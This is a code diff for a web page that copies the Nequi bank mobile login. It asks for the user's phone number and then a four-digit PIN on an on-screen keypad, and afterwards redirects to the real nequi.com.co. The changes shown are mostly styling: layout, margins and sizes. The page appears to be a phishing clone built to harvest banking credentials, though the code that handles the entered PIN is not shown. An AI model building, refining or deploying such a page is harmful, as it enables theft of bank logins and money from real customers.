@@ -14,20 +14,31 @@
       height: 100vh; 
       color: white;
       overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
-    #screen1, #screen2 {
+    .phone-frame {
+      width: 100%;
       max-width: 420px;
-      margin: 0 auto;
       height: 100vh;
+      background: #1F0829;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* ==================== PANTALLA 1 ==================== */
+    #screen1, #screen2 {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       padding: 20px;
       display: flex;
       flex-direction: column;
       background: #1F0829;
-      position: absolute;
-      width: 100%;
-      top: 0;
-      left: 0;
     }
 
     .help {
@@ -46,20 +57,20 @@
     }
 
     .nequi-logo {
-      margin-top: 110px;
-      font-size: 62px;
+      margin-top: 90px;
+      font-size: 58px;
       font-weight: 700;
       text-align: center;
       color: white;
     }
     .nequi-logo span {
       color: #FF2D95;
-      margin-right: 10px;
+      margin-right: 8px;
     }
 
     .label {
       text-align: center;
-      margin: 70px 0 30px 0;
+      margin: 80px 0 35px 0;
       font-size: 17.5px;
       color: #D8B5E8;
     }
@@ -67,7 +78,8 @@
     .input-box {
       background: #2C1642;
       border-radius: 12px;
-      padding: 5px;
+      padding: 6px;
+      margin: 0 15px;
     }
 
     input {
@@ -77,8 +89,9 @@
       border: none;
       padding: 18px 20px;
       font-size: 17px;
-      border-radius: 10px;
+      border-radius: 8px;
       outline: none;
+      text-align: center;
     }
 
     input:-webkit-autofill,
@@ -89,7 +102,7 @@
     }
 
     button {
-      margin-top: auto;
+      margin: 40px 15px 20px 15px;
       height: 58px;
       background: linear-gradient(to right, #FF2D95, #E6007E);
       color: white;
@@ -100,7 +113,7 @@
       box-shadow: 0 6px 20px rgba(255, 45, 149, 0.4);
     }
 
-    /* Pantalla 2 */
+    /* ==================== PANTALLA 2 ==================== */
     .back {
       position: absolute;
       top: 25px;
@@ -111,27 +124,27 @@
     }
 
     .title {
-      margin-top: 80px;
+      margin-top: 70px;
       text-align: center;
       font-size: 26px;
       font-weight: 500;
     }
 
     .pins {
-      margin: 50px 0 30px 0;
+      margin: 60px 0 35px 0;
       display: flex;
       justify-content: center;
-      gap: 20px;
+      gap: 22px;
     }
     .pin {
-      width: 58px;
-      height: 58px;
+      width: 55px;
+      height: 55px;
       background: #E0B0FF;
       border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 34px;
+      font-size: 32px;
       color: #3C0A55;
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
@@ -140,20 +153,21 @@
       text-align: center;
       color: #C8A2E0;
       font-size: 15.5px;
-      line-height: 1.45;
+      line-height: 1.5;
+      padding: 0 20px;
     }
 
     .keyboard {
       margin-top: auto;
-      margin-bottom: 40px;
+      margin-bottom: 30px;
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 18px 35px;
-      padding: 0 30px;
+      gap: 20px 40px;
+      padding: 0 20px;
       font-size: 34px;
     }
     .key {
-      height: 70px;
+      height: 68px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -167,48 +181,54 @@
 </head>
 <body>
 
-  <!-- Pantalla 1 -->
-  <div id="screen1">
-    <div class="help">?</div>
-    <div class="nequi-logo"><span>■</span>Nequi</div>
-    <div class="label">Ingresa tu número de celular</div>
-    <div class="input-box">
-      <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
-    </div>
-    <button onclick="goToPassword()">Entra</button>
-  </div>
+  <div class="phone-frame">
 
-  <!-- Pantalla 2 -->
-  <div id="screen2" style="display:none;">
-    <div class="back" onclick="goBack()">←</div>
-    <div class="title">Escribe tu clave</div>
+    <!-- Pantalla 1 -->
+    <div id="screen1">
+      <div class="help">?</div>
+      <div class="nequi-logo"><span>■</span>Nequi</div>
+      <div class="label">Ingresa tu número de celular</div>
+      
+      <div class="input-box">
+        <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
+      </div>
 
-    <div class="pins" id="pins">
-      <div class="pin"></div>
-      <div class="pin"></div>
-      <div class="pin"></div>
-      <div class="pin"></div>
+      <button onclick="goToPassword()">Entra</button>
     </div>
 
-    <div class="message">
-      No dudamos que seas tú...<br>
-      Pero es mejor confirmar ;)
+    <!-- Pantalla 2 -->
+    <div id="screen2" style="display:none;">
+      <div class="back" onclick="goBack()">←</div>
+      <div class="title">Escribe tu clave</div>
+
+      <div class="pins" id="pins">
+        <div class="pin"></div>
+        <div class="pin"></div>
+        <div class="pin"></div>
+        <div class="pin"></div>
+      </div>
+
+      <div class="message">
+        No dudamos que seas tú...<br>
+        Pero es mejor confirmar ;)
+      </div>
+
+      <div class="keyboard">
+        <div class="key" onclick="addDigit(1)">1</div>
+        <div class="key" onclick="addDigit(2)">2</div>
+        <div class="key" onclick="addDigit(3)">3</div>
+        <div class="key" onclick="addDigit(4)">4</div>
+        <div class="key" onclick="addDigit(5)">5</div>
+        <div class="key" onclick="addDigit(6)">6</div>
+        <div class="key" onclick="addDigit(7)">7</div>
+        <div class="key" onclick="addDigit(8)">8</div>
+        <div class="key" onclick="addDigit(9)">9</div>
+        <div class="key"></div>
+        <div class="key" onclick="addDigit(0)">0</div>
+        <div class="key delete" onclick="deleteDigit()">✕</div>
+      </div>
     </div>
 
-    <div class="keyboard">
-      <div class="key" onclick="addDigit(1)">1</div>
-      <div class="key" onclick="addDigit(2)">2</div>
-      <div class="key" onclick="addDigit(3)">3</div>
-      <div class="key" onclick="addDigit(4)">4</div>
-      <div class="key" onclick="addDigit(5)">5</div>
-      <div class="key" onclick="addDigit(6)">6</div>
-      <div class="key" onclick="addDigit(7)">7</div>
-      <div class="key" onclick="addDigit(8)">8</div>
-      <div class="key" onclick="addDigit(9)">9</div>
-      <div class="key"></div>
-      <div class="key" onclick="addDigit(0)">0</div>
-      <div class="key delete" onclick="deleteDigit()">✕</div>
-    </div>
   </div>
 
   <script>
@@ -260,7 +280,7 @@
 
       setTimeout(() => {
         window.location.href = "https://www.nequi.com.co";
-      }, 1600);
+      }, 1500);
     }
 
     function goBack() {
